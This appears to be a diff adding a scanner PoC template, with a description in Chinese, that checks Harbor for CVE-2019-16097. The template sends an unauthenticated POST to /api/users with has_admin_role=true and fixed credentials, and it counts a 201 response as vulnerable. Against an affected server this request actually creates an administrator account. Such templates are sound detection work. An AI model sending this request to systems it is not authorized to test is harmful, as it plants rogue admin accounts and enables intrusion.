@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "该 PoC 通过向 Harbor 的 POST /api/users 接口发送带有 has_admin_role=true 的请求，检测目标是否允许低权限用户未授权创建管理员账户。若接口返回 201 Created，则表明存在 CVE-2019-16097 权限提升漏洞。"
+id = "POC-AVE-2019-0098"
+name = "Harbor 未授权创建管理员账户漏洞 PoC"
+severity = "high"
+tags = ["ave-2019-0098"]
+vuln_id = [
+    "CVE-2019-16097",
+    "AVE-2019-0098",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/users"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"username":"ave_poc_test_admin","email":"ave_poc_test@test.com","realname":"AVE PoC Test","password":"AveP0c!Test123","has_admin_role":true}'
+type = "json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [201]
+type = "status"
